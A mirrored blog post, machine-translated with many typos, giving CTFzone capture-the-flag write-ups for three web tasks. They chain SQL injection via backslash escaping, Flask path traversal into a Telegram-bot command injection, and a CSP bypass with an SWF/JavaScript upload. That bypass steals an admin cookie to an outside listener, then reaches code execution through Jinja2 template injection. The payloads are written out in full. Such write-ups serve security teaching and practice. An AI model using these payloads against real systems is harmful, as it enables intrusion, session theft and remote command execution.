<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CTFzone write-ups - Deeper into the WEB</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Friends, we hope that everyone's weekend went well, and you are ready to break your head again a little over the CTFzone tasks. We continue to publish...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>CTFzone write-ups - Deeper into the WEB</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/files/de8/9a6/d67/de89a6d6758147509de16c07f02a2bf3.png" alt="image"></p><br><p>  Friends, we hope that everyone's weekend went well, and you are ready to break your head again a little over the CTFzone tasks.  We continue to publish raitap to the task, and today we will analyze the <strong>WEB</strong> thread.  Just in case, stock quotes and go;) </p><br><p>  The direction of WEB was the second most popular after Forensics, with a total of at least one task decided by 303 people.  By the way, out of them, the task for 1000 was decided by only five participants, so we will pay special attention to it.  Tasks for 50 and 100 have already been published, so we will immediately move on to tasks more difficult. </p><br><a name="habracut"></a><br><h4 id="web_300-need-to-go-deeper">  WEB_300.  Need to go deeper </h4><br><blockquote>  <em><strong>Captain Picard</strong> : Lieutenant, over!</em>  <em>We have found one of the main alien hackers.</em>  <em>He is one of his websites.</em>  <em>I know you still haven‚Äôt been repairing your ship.</em>  <em>It will help you to catch it.</em> </blockquote><p><br>  <strong>Decision:</strong> </p><br><p>  So, in this task we need to get information that will help to catch the leader of the group of hackers.  We know that this information is contained on the site, and to get the data, it must be hacked. </p><br><p>  The site is a news blog with the ability to search: </p><br><p><img src="https://habrastorage.org/files/b97/4f5/0c2/b974f50c2d5544eaaa90dc0b9776c63f.PNG" alt="image"></p><br><p> Run brute force directories (for example, using <code>dirb</code> ) </p><br><p><img src="https://habrastorage.org/files/6d2/2b2/6ef/6d22b26efd1c498489190c68bb3fdf47.PNG" alt="image"></p><br><p>  As you can see, there is a <code>.git</code> directory.  Let's try to download the sources (for example, using <code>rip-git</code> ) </p><br><p><img src="https://habrastorage.org/files/c58/ba4/90d/c58ba490dbdf48f1b6efc0477a031fe8.PNG" alt="image"></p><br><p>  As a result, we will get about the following files: </p><br><p><img src="https://habrastorage.org/files/bf3/9f0/7ba/bf39f07ba9ef4772ba4a5f46bff62d0c.PNG" alt="image"></p><br><p>  Consider the most interesting part of <code>index.php</code> : </p><br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> ... <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>])) $filter = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> $filter = <span class="hljs-string"><span class="hljs-string">'%'</span></span>; <span class="hljs-comment"><span class="hljs-comment">// all news if (preg_match("/'/", $filter)) error('Hacking attempt!'); // hate hackers if ($filter !== '%') { if (isset($_GET['type'])) { switch ($_GET['type']) { case 1: // looking for contains $filter = '%' . $filter . '%'; break; case 2: // looking for eactly matches break; default: error('Type of search is incorrect!'); } } else error('Type of search is empty!'); } $query = "CALL FIND_NEWS('" . $filter . "')"; $result = $mysqli-&gt;query($query); ...</span></span></code> </pre> </div></div><br><p>  Here is the logic of searching for news.  Depending on the <code>type</code> parameter, <code>%</code> either added to the <code>filter</code> parameter or not.  Then the contents of the <code>filter</code> passed inside the <code>SQL</code> procedure <code>FIND_NEWS</code> .  We do not know the content of the procedure, but from the title it is clear that it contains the logic of searching by filter. </p><br><p>  Immediately you can pay attention to the fact that the <code>filter</code> parameter is checked for the presence of single quotes before getting into the query.  No more screening.  <code>SQL</code> error can be caused using <code>\</code> at the end of the query (with <code>type</code> equal to 2), but you can‚Äôt do it in any way. </p><br><p><img src="https://habrastorage.org/files/ff3/20c/665/ff320c66549d40b493b43627669cf0f6.PNG" alt="image"></p><br><p>  We must dig in the direction of the procedure <code>FIND_NEWS</code> .  Since the <code>%</code> signs appear in the filter, it can be assumed that the search inside the procedure is performed using the <code>LIKE</code> operator.  A careful study of the search operation makes it clear that <code>filter</code> simultaneously searches for both the title of the news and its text.  So the query inside the procedure looks like this: </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> news <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> news_name <span class="hljs-keyword"><span class="hljs-keyword">LIKE</span></span> <span class="hljs-string"><span class="hljs-string">'$filter$'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> news_tet <span class="hljs-keyword"><span class="hljs-keyword">LIKE</span></span> <span class="hljs-string"><span class="hljs-string">'$filter$'</span></span>;</code> </pre> <br><p>  So, the logic is clear, but the implementation inside the procedure is unknown to us.  Perhaps the procedure first builds the query as a string, and then executes it.  In this case, <code>SQL Injection</code> is possible inside, but if this is true, how can you break the logic of the query and do something else without a single quote?  It is worth paying attention to the fact that inside the procedure, the <code>filter</code> parameter is probably used in two places.  And here we are come to the rescue by a return slash. </p><br><p>  If the parameter will be: </p><br><pre> <code class="bash hljs">+or+1=1+--+\</code> </pre> <br><p>  That request will turn out like this: </p><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> news <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> news_name <span class="hljs-keyword"><span class="hljs-keyword">LIKE</span></span> <span class="hljs-string"><span class="hljs-string">' or 1=1 -- \' OR news_tet LIKE '</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-comment"><span class="hljs-comment">-- \';</span></span></code> </pre> <br><p>  This is quite a working request, which should bring us all the available news.  However, the problem remains - the backslash breaks the initial request and does not even get into the procedure.  The solution is obvious - it needs to be screened.  In this case, it will be safe for the first request (procedure call), but inside the procedure it will turn into a dangerous single backslash.  It turns out about the following: </p><br><pre> <code class="bash hljs">+or+1=1+--+\\</code> </pre> <br><p>  We try: </p><br><p><img src="https://habrastorage.org/files/979/a2f/ed7/979a2fed70864955bd5cc8a6a2202da4.PNG" alt="image"></p><br><p>  As you can see, the request worked successfully, and the news was loaded.  Our vector for <code>SQL Injection</code> works.  Now it just remains to spin the injection and find the flag. </p><br><p>  Find out the number of columns: </p><br><pre> <code class="bash hljs">+union+select+1,2,3+--+\\</code> </pre> <br><p>  Now we learn the names of the tables: </p><br><pre> <code class="bash hljs">+union+select+1,table_name,3+from+information_schema.tables+--+\\</code> </pre> <br><p>  From interesting: </p><br><p><img src="https://habrastorage.org/files/898/47d/009/89847d00920445949d2ace7642665bbe.PNG" alt="image"></p><br><p>  Now we know that there is a <code>secret</code> table.  We recognize her columns: </p><br><pre> <code class="bash hljs">+union+select+1,column_name,3+from+information_schema.columns+<span class="hljs-built_in"><span class="hljs-built_in">where</span></span>+table_name=<span class="hljs-string"><span class="hljs-string">"secret"</span></span>+--+\\</code> </pre> <br><p><img src="https://habrastorage.org/files/8af/ada/72d/8afada72dedd4008aee9455c0b4140cf.PNG" alt="image"></p><br><p>  The last step - pull out the flag. </p><br><pre> <code class="bash hljs">+union+select+1,flag,3+from+secret+--+\\</code> </pre> <br><p><img src="https://habrastorage.org/files/c36/494/440/c36494440a3341d1a85b216ce946afdd.PNG" alt="image"></p><br><p>  Hooray!  Flag received! </p><br><p>  <strong>Answer:</strong> <em>ctfzone {VeRY_d33p}</em> </p><br><h4 id="web_500-such-hack">  WEB_500.  Such hack </h4><br><blockquote>  <em><strong>Captain Picard:</strong> Lieutenant, we have detected an alien's news website.</em>  <em>Perhaps, there will be some data on their plans.</em>  <em>Get it!</em> </blockquote><p>  <strong>Decision:</strong> </p><br><p>  In this task, we need to access the server where the key is located. </p><br><p>  The main page is as follows: </p><br><p><img src="https://habrastorage.org/files/177/1d4/ecc/1771d4eccb9145868554baa911137532.PNG" alt="image"></p><br><p>  Sitemap is very simple: </p><br><p><img src="https://habrastorage.org/files/ec7/b2b/074/ec7b2b074fd54cc8bd2ae6a7b38676aa.PNG" alt="image"></p><br><p>  From the server headers it is clear that <code>Flask</code> is being used.  The vulnerability was the incorrect use of the <code>send_file()</code> function and routing.  As a result, <code>Path Traversal</code> in the name of static files. </p><br><p>  Here is a cut from the source code for a better understanding of the vulnerability (Note that during the competition, players did not have access to the source codes): </p><br><pre> <code class="python hljs"><span class="hljs-meta"><span class="hljs-meta">... </span></span>@app.route(<span class="hljs-string"><span class="hljs-string">"/static/&lt;path:filetype&gt;/&lt;path:filename&gt;"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">style_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(filetype, filename)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> filetype <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> app.static_types: <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> filetype == <span class="hljs-string"><span class="hljs-string">'css'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> send_file(<span class="hljs-string"><span class="hljs-string">'./static/css/'</span></span> + filename, mimetype=<span class="hljs-string"><span class="hljs-string">'tet/css'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> filetype == <span class="hljs-string"><span class="hljs-string">'js'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> send_file(<span class="hljs-string"><span class="hljs-string">'./static/js/'</span></span> + filename, mimetype=<span class="hljs-string"><span class="hljs-string">'tet/javascript'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> send_file(<span class="hljs-string"><span class="hljs-string">'./static/img/'</span></span> + filename, mimetype=<span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) ecept Eception <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> e: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> render_template(<span class="hljs-string"><span class="hljs-string">'404.html'</span></span>), <span class="hljs-number"><span class="hljs-number">404</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> render_template(<span class="hljs-string"><span class="hljs-string">'404.html'</span></span>), <span class="hljs-number"><span class="hljs-number">404</span></span> ...</code> </pre> <br><p>  As a result, we get an arbitrary reading of files: </p><br><p><img src="https://habrastorage.org/files/c7d/bfb/cad/c7dbfbcade334434abe11678f7cf43ac.PNG" alt="image"></p><br><p>  If you look closely at <code>/etc/passwd</code> , you can pay attention to the last lines: </p><br><pre> <code class="bash hljs">... web::1000:1000::/home/web:/bin/bash telegram_bot::1001:1001::/home/telegram_bot:/bin/bash</code> </pre> <br><p>  In addition to the web server, the telegram-bot is spinning here, and it is located in the <code>/home/telegram_bot</code> folder.  We try to read the most obvious file in the home directory: <code>.bash_history</code> </p><br><p><img src="https://habrastorage.org/files/d0b/a01/7c3/d0ba017c38ba4f89a8a4103780a2e4e6.PNG" alt="image"></p><br><p>  Consequently, the bot source is located along the path <code>/home/telegram_bot/bot.py</code> . </p><br><p>  Similarly, we read the <code>bot.py</code> file: </p><br><div class="spoiler">  <b class="spoiler_title">Source bot</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment"># -*- coding: utf-8 -*- #!/usr/bin/python2 import telebot import subprocess # SysAdminHelper_bot token = raw_input() bot = telebot.TeleBot(token) @bot.message_handler(commands=['uname', 'ps', 'uptime']) def repeat_all_messages(message): waf_rules = [';', '&amp;', '|'] for rule in waf_rules: if rule in message.tet: output = 'stop hacking!' bot.send_message(message.chat.id, output) return args = message.tet.split(' ') output = '' if ( args[0] == '/uptime' ): try: output = subprocess.check_output(["uptime"], shell=True) except: output = 'eception' elif ( args[0] == '/uname' ): try: output = subprocess.check_output(["uname -a"], shell=True) except: output = 'exception' elif ( args[0] == '/ps' ): try: output = subprocess.check_output(["ps au | grep %s" % args[1]], shell=True) except: output = 'eception' else: output = 'eception' bot.send_message(message.chat.id, output) if __name__ == '__main__': bot.polling(none_stop=True)</span></span></code> </pre> </div></div><br><p>  As you can see, the main purpose of the bot is to execute primitive remote commands on the server.  If you look closely, you can see the following line: </p><br><pre> <code class="bash hljs">output = subprocess.check_output([<span class="hljs-string"><span class="hljs-string">"ps au | grep %s"</span></span> % args[1]], shell=True)</code> </pre> <br><p>  It is interesting because the argument is passed to the <code>ps aux</code> command, and it is not checked in any way.  This is a clear RCE. </p><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># SysAdminHelper_bot</span></span></code> </pre> <br><p>  This line gives us the name of the bot.  Easily find it in the telegraph. </p><br><p><img src="https://habrastorage.org/files/17b/994/3d4/17b9943d4c244a40b898d67bb0cbb74d.PNG" alt="image"></p><br><p>  We try to execute the legitimate command: </p><br><p><img src="https://habrastorage.org/files/e6d/63c/648/e6d63c6487cc42b68f1cc534ef8c42df.PNG" alt="image"></p><br><p>  Although we have an explicit RCE, several restrictions are imposed on it: </p><br><ul><li>  There can be no spaces in the command, since the bot separates the arguments through spaces. </li><li>  We cannot use the <code>&amp; ; |</code> <code>&amp; ; |</code>  because  they are prohibited in the bot code. </li></ul><br><p>  In this case, there are several different solutions, consider one of them. </p><br><p>  Since the bectics are allowed, you can execute code through them.  The complete command will look like this: </p><br><pre> <code class="bash hljs">ps au | grep `uname -a`</code> </pre> <br><p>  To solve the problem with spaces, you can use the following construction: </p><br><pre> <code class="bash hljs">ps au | grep `{uname,-a}`</code> </pre> <br><p>  Locally, the result of the team's work is as follows: </p><br><p><img src="https://habrastorage.org/files/ada/a20/e45/adaa20e4541a4df0848916a1b183abdf.PNG" alt="image"></p><br><p>  Our vector works, but the problem is that the output first goes to <code>grep</code> , is processed there and eventually ends up in <code>STDERR</code> (error output stream) instead of <code>STDOUT</code> (normal output stream).  If such a vector is transmitted to the bot, then the presence of data in <code>STDERR</code> generate an exception, due to which we will not see any output.  In simple words, our <code>RCE</code> works, but we see no result. </p><br><p>  But now is the time to recall that at the previous stage we found <code>Path Traversal</code> .  As a result, we get a bunch of <code>Blind RCE</code> and <code>Path Traversal</code> .  So, we can write the output of <code>RCE</code> to a file, and <code>Path Traversal</code> will easily read it.  The final vector is as follows: </p><br><pre> <code class="bash hljs">``{ls,/home/}&gt;/tmp/output``</code> </pre> <br><p>  Bacti on 2 on each side because the client telegram highlights the text inside the single baktik as code and deletes them. </p><br><p>  We send the vector to the bot and get in response the expected expected <code>eception</code> : </p><br><p><img src="https://habrastorage.org/files/769/a77/b76/769a77b762154369a4f77d66a9ef2393.PNG" alt="image"></p><br><p>  Through <code>Path Traversal</code> we read the <code>/tmp/output</code> file: </p><br><p><img src="https://habrastorage.org/files/a8c/616/dee/a8c616deeb11454c9c538b98abe85774.PNG" alt="image"></p><br><p>  Thus, we learned that there are 3 folders in the <code>/home/</code> folder: <code>flag</code> , <code>telegram_bot</code> and <code>web</code> </p><br><p>  Completely similarly read the contents of the <code>flag</code> folder: </p><br><p><img src="https://habrastorage.org/files/e35/a74/257/e35a742571dd4863b2cd49e55f5be4f3.PNG" alt="image"></p><br><p>  We read the flag: </p><br><p><img src="https://habrastorage.org/files/d05/167/b01/d05167b0116a4bd98e3ecc9411baa91c.PNG" alt="image"></p><br><p>  <strong>Answer:</strong> <em>ctfzone {W0W_SUCH_H @ CK_W0W}</em> </p><br><h4 id="web_1000-banner-flipping">  WEB_1000.  Banner flipping </h4><br><blockquote>  <em><strong>Captain Picard:</strong> Advanced technology industries.</em>  <em>Their control system.</em>  <em>I need to unlock it.</em>  <em>It has been given that it has been available on the ship.</em>  <em>The team had to work with them.</em>  <em>It is a system of artificial intelligence.</em>  <em>You have to hack their system.</em> </blockquote><p><br>  <strong>Decision:</strong> </p><br><p>  We go to the site.  We immediately see the search form, in which the query from the search line is displayed.  The first thought is <code>XSS</code> . </p><br><p><img src="https://habrastorage.org/files/f98/c01/0ee/f98c010eecab4a699eb787de09328b93.png" alt="image"></p><br><p>  We start to try <code>XSS</code> vectors.  We bypass the simplest filtering, for example, using uppercase. <br>  We see an injection in the code page: </p><br><pre> <code class="python hljs">&lt;div <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">row</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">col</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">s6</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">offset</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">s3</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">card</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">orange</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">lighten</span></span></span><span class="hljs-class">-3"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">class</span></span></span><span class="hljs-class">="</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">card</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">content</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">white</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">te</span></span></span><span class="hljs-class"></span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">t</span></span></span><span class="hljs-class">"&gt; &lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">p</span></span></span><span class="hljs-class">&gt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Nothing</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">found</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">for</span></span></span><span class="hljs-class"> '</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">asd</span></span></span><span class="hljs-class">&lt;</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Img</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">src</span></span></span><span class="hljs-class">= </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">onerror</span></span></span><span class="hljs-class">=</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">alert</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(</span></span><span class="hljs-number"><span class="hljs-class"><span class="hljs-params"><span class="hljs-number">1</span></span></span></span><span class="hljs-class"><span class="hljs-params">)</span></span></span><span class="hljs-class">&gt;'&lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">p</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class">&gt; &lt;/</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">div</span></span></span><span class="hljs-class">&gt;</span></span></code> </pre><br><p>  It looks like XSS is in our pocket.  But for some reason, the <code>alert</code> does not work, look at the browser console: </p><br><p><img src="https://habrastorage.org/files/014/11d/8ab/01411d8ab937492d805713993526403c.png" alt="image"></p><br><p>  Content Security Policy.  Server sends headers: </p><br><pre> <code class="bash hljs">HTTP/1.1 200 OK Connection: close Content-Type: tet.html; charset=utf-8 Content-Length: 1930 X-XSS-Protection: 0 Content-Security-Policy: style-src <span class="hljs-string"><span class="hljs-string">'unsafe-inline'</span></span> <span class="hljs-string"><span class="hljs-string">'self'</span></span>;script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span>;object-src <span class="hljs-string"><span class="hljs-string">'none'</span></span>;</code> </pre> <br><p>  Well, you can not bypass the browser's auditor, but the execution of the script is allowed only from files located on the server. <br>  We are looking for new buttons on the site.  There is a feedback form in which you will most likely have to drop the link to the admin.  And the form of loading ads.  We try to load the <code>.js</code> file. </p><br><p><img src="https://habrastorage.org/files/b43/bc4/49b/b43bc449bb914d5f829d962c1f2ccd1a.png" alt="image"></p><br><p>  Only images and <code>swf</code> allowed.  Judging by the fact that we found the <code>XSS</code> before, it is necessary to fill <code>js</code> .  In this case, all files are checked for resolution and a few more parameters.  After some thought, we decide to try <code>swf</code> from the repository <code>https://github.com/evilcos/ss.swf</code> . </p><br><p>  We get the error: </p><br><p><img src="https://habrastorage.org/files/bf3/45b/806/bf345b8067f64f39903d7dc21dd9d346.png" alt="image"></p><br><p>  It seems, it is necessary to be confused with <code>swf</code> .  According to legend, <code>adblock</code> is still off.  It may be possible to slip a swf file with a valid <code>javascript</code> syntax.  First, change the header from <code>CWS</code> to <code>FWS</code> .  Now the server considers that the <code>swf</code> file is not compressed. </p><br><p><img src="https://habrastorage.org/files/512/f6c/f1b/512f6cf1bfff4035828adf1acbea4719.png" alt="image"></p><br><p>  The next problem is <code>framerate</code> .  What we gobble spec, we find that at the offset <code>0x12</code> it just lies. <br>  Now our <code>swf</code> uploaded to the server.  It remains to make a valid <code>javascript</code> and to get started with cookies.  We form <code>payload</code> : </p><br><p><img src="https://habrastorage.org/files/0f3/94c/214/0f394c214e3a49ab921a1852cf9bc7b4.png" alt="image"></p><br><p>  And now do <code>ss</code> ! <br>  We form payload: </p><br><pre> <code class="bash hljs">web1000.ctf/?search=<span class="hljs-string"><span class="hljs-string">"&lt;SCRIPT/SRC="</span></span>/uploads/ss7.swf<span class="hljs-string"><span class="hljs-string">"&gt;&lt;/SCRIPT&gt;&lt;p&gt;</span></span></code> </pre> <br><p>  We get cookies. </p><br><pre> <code class="python hljs">GET /?=SESSION=eyJzZWNyZXQiOiAiOWI0NjAyZDlhNTI0OTAyNzU2YTcwYjg5NDlhZGNiMWYiLCAidXNlciI6ICJhZG1pbiJ9 HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> User-Agent: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (Unknown; Linux x86_64) AppleWebKit/<span class="hljs-number"><span class="hljs-number">538.1</span></span> (KHTML, like Gecko) PhantomJS/<span class="hljs-number"><span class="hljs-number">2.1</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span> Safari/<span class="hljs-number"><span class="hljs-number">538.1</span></span> Referer: http://<span class="hljs-number"><span class="hljs-number">10.1</span></span><span class="hljs-number"><span class="hljs-number">.2</span></span><span class="hljs-number"><span class="hljs-number">.20</span></span>:<span class="hljs-number"><span class="hljs-number">8081</span></span>/?search=%<span class="hljs-number"><span class="hljs-number">22</span></span>%<span class="hljs-number"><span class="hljs-number">3</span></span>CSCRIPT/SRC=%<span class="hljs-number"><span class="hljs-number">22</span></span>/uploads/xss7.swf%<span class="hljs-number"><span class="hljs-number">22</span></span>%<span class="hljs-number"><span class="hljs-number">3</span></span>E%<span class="hljs-number"><span class="hljs-number">3</span></span>C/SCRIPT%<span class="hljs-number"><span class="hljs-number">3</span></span>E%<span class="hljs-number"><span class="hljs-number">3</span></span>Cp%<span class="hljs-number"><span class="hljs-number">3</span></span>E Origin: http://<span class="hljs-number"><span class="hljs-number">10.1</span></span><span class="hljs-number"><span class="hljs-number">.2</span></span><span class="hljs-number"><span class="hljs-number">.20</span></span>:<span class="hljs-number"><span class="hljs-number">8081</span></span> Accept: */* Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: ru-RU,en,* Host: <span class="hljs-number"><span class="hljs-number">8.8</span></span><span class="hljs-number"><span class="hljs-number">.8</span></span><span class="hljs-number"><span class="hljs-number">.8</span></span>:<span class="hljs-number"><span class="hljs-number">1234</span></span></code> </pre> <br><p>  We go, but it seems that this is not enough. </p><br><p><img src="https://habrastorage.org/files/274/8bd/128/2748bd128a184870b8394d84486c3bc0.png" alt="image"></p><br><p>  We look session: obviously <code>base64</code> .  Decodim: </p><br><pre> <code class="bash hljs">eyJzZWNyZXQiOiAiOWI0NjAyZDlhNTI0OTAyNzU2YTcwYjg5NDlhZGNiMWYiLCAidXNlciI6ICJhZG1pbiJ9 {<span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"9b4602d9a524902756a70b8949adcb1f"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: <span class="hljs-string"><span class="hljs-string">"admin"</span></span>}</code> </pre> <br><p>  Why is the username here?  Change the session.  The username on the page is changing.  After much deliberation and attempts, try <code>{{ 2+2 }}</code> .  We get 4. </p><br><p>  It looks like an injection into a pattern.  Operating methods are well described <a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/">here</a> . </p><br><p>  We try everything.  It turns out that from <code>magic_methods</code> c <code>underscore</code> , the python becomes bad.  But there is a great way to operate through <code>from_pyfile</code> .  We have learned to upload files similar to the code in the first part of the task.  We need this <code>payload</code> : </p><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> subprocess <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> check_output RUNCMD = check_output</code> </pre> <br><p>  Upload this file to the server as <code>swf</code> : </p><br><p><img src="https://habrastorage.org/files/c3d/88e/399/c3d88e399d244ba3a5f6fc61d714b7d6.png" alt="image"></p><br><p>  We load it using the session: </p><br><pre> <code class="python hljs">{ <span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"9b4602d9a524902756a70b8949adcb1f"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: <span class="hljs-string"><span class="hljs-string">"{{ config.from_pyfile('uploads/12.swf') }}"</span></span> }</code> </pre> <br><p>  Now we can execute any commands on the server. <br>  Checking <code>config.items()</code> </p><br><p><img src="https://habrastorage.org/files/bc5/c15/36e/bc5c1536edbe43b6b573bbface52730f.png" alt="image"></p><br><p>  It now remains to find the flag: </p><br><pre> <code class="python hljs">{ <span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"9b4602d9a524902756a70b8949adcb1f"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: <span class="hljs-string"><span class="hljs-string">"{{ config['RUNCMD']('ls', shell=True)}}"</span></span> }</code> </pre> <br><p>  We get the answer: </p><br><pre> <code class="python hljs">admin_blueprint.py admin_blueprint.pyc application.py application.pyc flag.tt ghostdriver.log requirements.tt static task.py templates uploads worker.py worker.pyc</code> </pre> <br><p>  Everything.  <code>cat flag.tt</code> left to do </p><br><p><img src="https://habrastorage.org/files/ba8/192/737/ba8192737ed04d18a126705be7174ca8.png" alt="image"></p><br><p>  Done! 